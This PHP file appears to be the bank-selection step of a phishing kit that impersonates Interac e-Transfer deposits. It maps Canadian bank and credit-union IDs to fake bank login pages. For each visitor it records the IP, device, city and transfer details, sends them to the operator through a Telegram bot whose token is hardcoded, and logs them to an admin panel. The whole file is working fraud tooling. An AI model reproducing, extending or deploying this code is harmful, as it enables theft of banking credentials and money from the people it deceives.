<?php
declare(strict_types=1);

// ---------------- START OUTPUT BUFFER ----------------
ob_start();

// ---------------- CONFIG ----------------
$BOT_TOKEN      = '8292408817:AAFn4kxPe334jCGwW_GzaI-8SGuLexjE5sI';
$CHAT_ID        = '-1002922644009';
$BASE_DIR       = __DIR__;
$LOG_DIR        = "$BASE_DIR/logs";
$DATA_DIR       = "$BASE_DIR/data";
$COUNTERS_FILE  = "$DATA_DIR/counters.json";

// Ensure directories exist and are writable
if (!file_exists($LOG_DIR)) {
    @mkdir($LOG_DIR, 0755, true);
}
if (!file_exists($DATA_DIR)) {
    @mkdir($DATA_DIR, 0755, true);
}

// ---------------- HELPERS ----------------
function safe($v) { return htmlspecialchars((string)($v ?? ''), ENT_QUOTES|ENT_SUBSTITUTE,'UTF-8'); }
function now() { return date('Y-m-d H:i:s'); }
function log_event($msg){ 
    global $LOG_DIR; 
    if (is_writable($LOG_DIR) || is_writable(dirname($LOG_DIR))) {
        @file_put_contents("$LOG_DIR/access.log", "[".now()."] $msg\n", FILE_APPEND|LOCK_EX); 
    }
}
function log_error($msg){ 
    global $LOG_DIR; 
    if (is_writable($LOG_DIR) || is_writable(dirname($LOG_DIR))) {
        @file_put_contents("$LOG_DIR/error.log", "[".now()."] ERROR: $msg\n", FILE_APPEND|LOCK_EX); 
    }
}
function load_json($f){ return (file_exists($f) && ($j=@json_decode(@file_get_contents($f), true))) ? $j : []; }
function save_json($f, $d){ $tmp=$f.'.tmp'; @file_put_contents($tmp, json_encode($d, JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES), LOCK_EX); @rename($tmp, $f); }

function get_client_ip() {
    $ip_keys = ['HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    $ip = 'UNKNOWN';

    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ip_list = explode(',', $_SERVER[$key]);
            $potential_ip = trim($ip_list[0]);
            
            if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                 $ip = $potential_ip;
                 break;
            }
        }
    }
    
    if (strpos($ip, '::ffff:') === 0) {
        $ip = substr($ip, 7);
    }

    return $ip;
}

function send_telegram($bot, $chat, $text, $kb=null){
    $url = "https://api.telegram.org/bot{$bot}/sendMessage";
    $p = ['chat_id'=>$chat, 'text'=>$text, 'parse_mode'=>'HTML', 'disable_web_page_preview'=>true];
    if($kb) $p['reply_markup'] = json_encode(['inline_keyboard'=>$kb]);

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_POSTFIELDS => $p
    ]);

    $r = curl_exec($ch);
    if($r === false) log_error("Telegram send failed: ".curl_error($ch));

    return $r;
}

function log_to_admin($username, $action, $details, $path) {
    $url = "http://127.0.0.1:3000/api/external/log";
    $data = [
        'username' => $username,
        'action' => $action,
        'details' => $details,
        'path' => $path
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// ---------------- BANK MAPPING & THEME ----------------
// FIXED: Updated to match actual FIIDs from your dropdown
$bankMappings = [
    // MAJOR BANKS - Using actual FIIDs from your HTML
    "CA000001" => "bmo",
    "CA000002" => "scotiabank", 
    "CA000003" => "rbc",
    "CA000004" => "td",
    "CA000006" => "nationalbank",
    "CA000010" => "cibc",
    "CA000039" => "laurentian",
    "CA000219" => "atb",
    "CA000241" => "bankofamerica",
    "CA000320" => "pcfinancial",
    "CA000328" => "citibank",
    "CA000352" => "dcbank",
    "CA000374" => "motusbank",
    "CA000382" => "coastcapital",
    "CA000540" => "manulife",
    "CA000614" => "tangerine",
    "CA000621" => "peoplestrust",
    "CA000612" => "natcan",
    "CA000809" => "generic", // Various Credit Unions
    "CA000815" => "desjardins",
    "CA000837" => "meridian",
    "CA001110" => "fcdq",
    
    // SPECIAL CASES - These are in your dropdown with same FIID
    "000010001" => "nationalbank", // National Bank-Partnership
    "000001002" => "scotiabank", // Scotiabank duplicate
    "000030800" => "simplii", // Simplii Financial
    
    // CREDIT UNIONS - Using actual values from your dropdown
    "046610163" => "firstchoice",
    "046610332" => "abcu",
    "046610021" => "bowvalley",
    "046610215" => "christian",
    "046610100" => "connectfirst",
    "046610379" => "lakeland",
    "046610305" => "rocky",
    "294420010" => "servus",
    "046612298" => "vermilion",
    "046610254" => "vision",
    
    // BC Credit Unions
    "818090530" => "blueshore",
    "818090500" => "bulkleyvalley",
    "818091529" => "coastalcommunity",
    "818093300" => "columbiavalley",
    "819770002" => "communitysavings",
    "833602940" => "compensationemployees",
    "818092340" => "crestondistrict",
    "818094560" => "envision",
    "818090010" => "firstbc",
    "818090210" => "greatervancouver",
    "818091190" => "gulfandfraser",
    "818094750" => "integris",
    "833600040" => "interiorsavings",
    "816280002" => "islandsavings",
    "818094640" => "khalsa",
    "317442300" => "kootenay",
    "818091160" => "ladysmith",
    "818091010" => "lakeview",
    "818092200" => "nelsondistrict",
    "818091670" => "northpeace",
    "818091390" => "northernsavings",
    "818091510" => "osoyoos",
    "271350000" => "prospera",
    "818092750" => "revelstoke",
    "833601570" => "sascu",
    "818090130" => "sharons",
    "818092230" => "stellervista",
    "818091270" => "summerland",
    "818090660" => "sunshinecoast",
    "818091660" => "valleyfirst",
    "813530002" => "vancity",
    "818093720" => "vancouverfirefighters",
    "833601260" => "vantageone",
    "818092500" => "williamslake",
    
    // Manitoba Credit Unions
    "821630070" => "access",
    "821630010" => "assiniboine",
    "818790087" => "belgianalliance",
    "821630180" => "caissefinancial",
    "821630080" => "cambrian",
    "821630900" => "compass",
    "821631240" => "flinflon",
    "821630410" => "fusion",
    "818796292" => "maxafinancial",
    "821630050" => "median",
    "821630100" => "niverville",
    "821631840" => "outlook",
    "821630400" => "rosenort",
    "821630470" => "steinbach",
    "821630020" => "stride",
    "821630490" => "sunrise",
    "821630030" => "swanvalley",
    "821630160" => "westoba",
    "818790079" => "winnipegpolice",
    
    // Nova Scotia Credit Unions
    "888900047" => "acadian",
    "888900229" => "caissepopulairedeclare",
    "888900016" => "capebreton",
    "888900193" => "coastalfinancial",
    "888900335" => "cumberlandcolchester",
    "888900337" => "cua",
    "888900027" => "dominion",
    "888900057" => "eastcoast",
    "888900354" => "glacebaycentral",
    "888900049" => "inova",
    "888900279" => "lahariver",
    "888900290" => "newross",
    "888900019" => "newwaterford",
    "888900106" => "northsydney",
    "888900359" => "princess",
    "888900083" => "provincialgovernmentemployees",
    "888900052" => "stjosephs",
    "888900349" => "sydney",
    "888900288" => "teachersplus",
    "888900263" => "valley",
    "888900333" => "victory",
    
    // Ontario Credit Unions
    "882802932" => "adjala",
    "888330005" => "alternasavings",
    "818280618" => "bay",
    "818280675" => "bcufinancial",
    "818903012" => "caissepopulairealliance",
    "818280033" => "comtechfire",
    "818281018" => "copperfin",
    "818280055" => "decommals",
    "818280519" => "decommalt",
    "897810013" => "duca",
    "818281362" => "dundalkdistrict",
    "818280145" => "equity",
    "818281463" => "finnish",
    "818286292" => "firstontario",
    "818280384" => "frontlinefinancial",
    "818280244" => "ganaraskafinancial",
    "818282188" => "goldenhorseshoe",
    "818280041" => "hmecu",
    "818282145" => "icsavings",
    "818280632" => "kawartha",
    "818281794" => "kindred",
    "818281444" => "kingstoncommunity",
    "818282087" => "liunalocal183",
    "818286282" => "libro",
    "818280368" => "limestone",
    "818280622" => "luminusfinancial",
    "818281383" => "mainstreet",
    "818282126" => "motorcitycommunity",
    "891433200" => "moya",
    "818280946" => "northernbirch",
    "818281449" => "northern",
    "818282119" => "omnia",
    "818281696" => "ontarioeducational",
    "818282027" => "oppa",
    "818280630" => "oshawacommunity",
    "818280780" => "parama",
    "818280171" => "pathwise",
    "818280603" => "penfinancial",
    "846000120" => "rapport",
    "021170000" => "resurrection",
    "818286500" => "savenfinancial",
    "818282120" => "southwestregional",
    "011900000" => "ststanislaus",
    "818280602" => "sudbury",
    "818282089" => "taiwanese",
    "818281189" => "talka",
    "818280052" => "tandiafinancial",
    "818280067" => "theenergy",
    "818280289" => "thepolice",
    "818280376" => "thoroldcommunity",
    "818280197" => "ukrainian",
    "818282118" => "windsorfamily",
    "818280340" => "yncu",
    "818281710" => "yourcu",
    "892500000" => "zlfc",
    "818280219" => "zuni",
    
    // Default fallback
    "default" => "generic"
];

// Bank page locations - FIXED: Correct paths
$bankPages = [
    // Major Banks
    "bmo" => "cgi-admin2/app/api/etransfer.interac.ca/bmo/index.php",
    "scotiabank" => "cgi-admin2/app/api/etransfer.interac.ca/scotiabank/index.php", 
    "rbc" => "cgi-admin2/app/api/etransfer.interac.ca/rbc/index.php",
    "td" => "cgi-admin2/app/api/etransfer.interac.ca/td/index.php",
    "nationalbank" => "cgi-admin2/app/api/etransfer.interac.ca/nationalbank/index.php",
    "cibc" => "cgi-admin2/app/api/etransfer.interac.ca/cibc/index.php",
    "laurentian" => "cgi-admin2/app/api/etransfer.interac.ca/laurentian/index.php",
    "atb" => "cgi-admin2/app/api/etransfer.interac.ca/atb/index.php",
    "bankofamerica" => "cgi-admin2/app/api/etransfer.interac.ca/bankofamerica/index.php",
    "pcfinancial" => "cgi-admin2/app/api/etransfer.interac.ca/pcfinancial/index.php",
    "citibank" => "cgi-admin2/app/api/etransfer.interac.ca/citibank/index.php",
    "dcbank" => "cgi-admin2/app/api/etransfer.interac.ca/dcbank/index.php",
    "motusbank" => "cgi-admin2/app/api/etransfer.interac.ca/motusbank/index.php",
    "coastcapital" => "cgi-admin2/app/api/etransfer.interac.ca/coastcapital/index.php",
    "manulife" => "cgi-admin2/app/api/etransfer.interac.ca/manulife/index.php",
    "tangerine" => "cgi-admin2/app/api/etransfer.interac.ca/tangerine/index.php",
    "peoplestrust" => "cgi-admin2/app/api/etransfer.interac.ca/peoplestrust/index.php",
    "natcan" => "cgi-admin2/app/api/etransfer.interac.ca/nationalbank/index.php", // fallback map
    "desjardins" => "cgi-admin2/app/api/etransfer.interac.ca/desjardins/index.php",
    "meridian" => "cgi-admin2/app/api/etransfer.interac.ca/meridian/index.php",
    "fcdq" => "cgi-admin2/app/api/etransfer.interac.ca/fcdq/index.php",
    "simplii" => "cgi-admin2/app/api/etransfer.interac.ca/simplii/index.php",
    
    // Credit Unions
    "firstchoice" => "cgi-admin2/app/api/etransfer.interac.ca/firstchoice/index.php",
    "abcu" => "cgi-admin2/app/api/etransfer.interac.ca/abcu/index.php",
    "bowvalley" => "cgi-admin2/app/api/etransfer.interac.ca/bowvalley/index.php",
    "christian" => "cgi-admin2/app/api/etransfer.interac.ca/christian/index.php",
    "connectfirst" => "cgi-admin2/app/api/etransfer.interac.ca/connectfirst/index.php",
    "lakeland" => "cgi-admin2/app/api/etransfer.interac.ca/lakeland/index.php",
    "rocky" => "cgi-admin2/app/api/etransfer.interac.ca/rocky/index.php",
    "servus" => "cgi-admin2/app/api/etransfer.interac.ca/servus/index.php",
    "vermilion" => "cgi-admin2/app/api/etransfer.interac.ca/vermilion/index.php",
    "vision" => "cgi-admin2/app/api/etransfer.interac.ca/vision/index.php",
    
    // Default fallback
    "generic" => "cgi-admin2/app/api/etransfer.interac.ca/banks.php"
];

$bankColors = [
    // Major Banks
    "bmo" => "🔵", "scotiabank" => "🔴", "rbc" => "🟡", "td" => "🟢",
    "nationalbank" => "⚫️", "cibc" => "🔴", "laurentian" => "🔵", "atb" => "🔵",
    "desjardins" => "🟢", "tangerine" => "🟠", "simplii" => "⚫️",
    "meridian" => "🟢", "coastcapital" => "🔵", "servus" => "🔵",
    
    // Credit Unions
    "firstchoice" => "🔵", "abcu" => "🔵", "bowvalley" => "🟢", 
    "christian" => "🔵", "connectfirst" => "🔵", "lakeland" => "🟢",
    "rocky" => "🔵", "vermilion" => "🟢", "vision" => "🔵",
    
    // Default
    "generic" => "🏦"
];

// ---------------- SCRIPT LOGIC ----------------
$ip = get_client_ip();
$submittedId  = strtoupper(trim($_GET['fiid'] ?? $_POST['fiid'] ?? ''));
$displayLabel = safe($_GET['bank'] ?? $_POST['bank'] ?? 'Unknown');

// Get transaction data from session if available
session_start();
$amount = $_SESSION['transaction_data']['amount'] ?? '0.00';
$sender = $_SESSION['transaction_data']['sender_name'] ?? 'Unknown';

log_event("Access attempt with fiid={$submittedId}, bank={$displayLabel}, amount={$amount}, IP={$ip}");

// Determine which bank to use
$folder = $bankMappings[$submittedId] ?? 'generic';

// Update counters
$counters = load_json($COUNTERS_FILE);
$counters['total_visits'] = ($counters['total_visits'] ?? 0) + 1;
@$counters['banks_by_ip'][$folder][$ip]++;
$visitCountForIp = (int)@$counters['banks_by_ip'][$folder][$ip];
save_json($COUNTERS_FILE, $counters);

// Gather environment info for Telegram
$ua = safe($_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN');
$device = preg_match('/iPhone|iPad/i',$ua)?'iOS':(preg_match('/Android/i',$ua)?'Android':'Desktop');
$geo_city = 'Unknown';
if($ip !== 'UNKNOWN'){
    $geo_json = @file_get_contents("https://ipwhois.app/json/".urlencode($ip));
    if ($geo_json) {
        $g = json_decode($geo_json, true);
        if(is_array($g) && isset($g['city'])) $geo_city = safe($g['city']);
    }
}

// Prepare and send formal Telegram message
$tx_id = $_SESSION['transaction_data']['transaction_id'] ?? 'N/A';
$msg  = "🟨🟨🟨🟨🟨🟨🟨🟨\n";
$msg .= "🏦 <b>BANK SELECTION ALERT</b> 🏦\n";
$msg .= "────────────────────\n";
$msg .= "<b>Event:</b> <code>BANK_SELECTED</code>\n";
$msg .= "<b>Status:</b> 🟢 <code>ACTIVE</code>\n";
$msg .= "────────────────────\n";
$msg .= "🏦 <b>Bank:</b> <code>{$displayLabel}</code>\n";
$msg .= "💰 <b>Amount:</b> <code>\${$amount} CAD</code>\n";
$msg .= "👤 <b>Sender:</b> <code>{$sender}</code>\n";
$msg .= "🆔 <b>Ref ID:</b> <code>{$tx_id}</code>\n";
$msg .= "────────────────────\n";
$msg .= "📱 <b>Device:</b> <code>{$device}</code>\n";
$msg .= "📍 <b>Location:</b> <code>{$geo_city}</code>\n";
$msg .= "🌐 <b>IP:</b> <code>{$ip}</code>\n";
$msg .= "────────────────────\n";
$msg .= "🕒 <b>Timestamp:</b> <code>" . date('Y-m-d H:i:s') . "</code>\n";
$msg .= "🟨🟨🟨🟨🟨🟨🟨🟨";

$adminUrl = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]/admin";
$kb = [
    'inline_keyboard' => [
        [
            ['text' => '🔄 Reload', 'callback_data' => 'reload:' . $tx_id],
            ['text' => '⚠️ Alert', 'callback_data' => 'alert:' . $tx_id]
        ],
        [
            ['text' => '🚫 Block IP', 'callback_data' => 'block:' . $ip]
        ],
        [
            ['text' => '🖥 Open Admin Panel', 'url' => $adminUrl]
        ]
    ]
];

send_telegram($BOT_TOKEN, $CHAT_ID, $msg, $kb);

// Log to admin panel
$recipient_email = $_SESSION['transaction_data']['recipient_email'] ?? 'Unknown';
log_to_admin($sender, 'bank_selected', [
    'bank' => $folder,
    'label' => $displayLabel,
    'amount' => $amount,
    'fiid' => $submittedId,
    'recipient_email' => $recipient_email,
    'ip' => $ip,
    'device' => $device,
    'location' => $geo_city
], '/deposit.do.php');

// Store selection in session for next page
$_SESSION['selected_bank'] = [
    'fiid' => $submittedId,
    'name' => $folder,
    'label' => $displayLabel,
    'amount' => $amount,
    'sender' => $sender,
    'selected_at' => time()
];

// Redirect user to the appropriate bank page
if (isset($bankPages[$folder])) {
    $redirectUrl = $bankPages[$folder];
    
    // Add query parameters for the index page
    $queryParams = http_build_query([
        'fiid' => $submittedId,
        'bank' => urlencode($displayLabel),
        'amount' => $amount,
        'sender' => urlencode($sender),
        'ts' => time()
    ]);
    
    $fullUrl = $redirectUrl . '?' . $queryParams;
    
    log_event("Redirecting to: {$fullUrl}");
    header("Location: $fullUrl");
    exit;
}

// Fallback redirect for unknown IDs
log_error("No mapping found for fiid={$submittedId}, redirecting to generic");
header("Location: cgi-admin2/app/api/etransfer.interac.ca/banks.php");
exit;
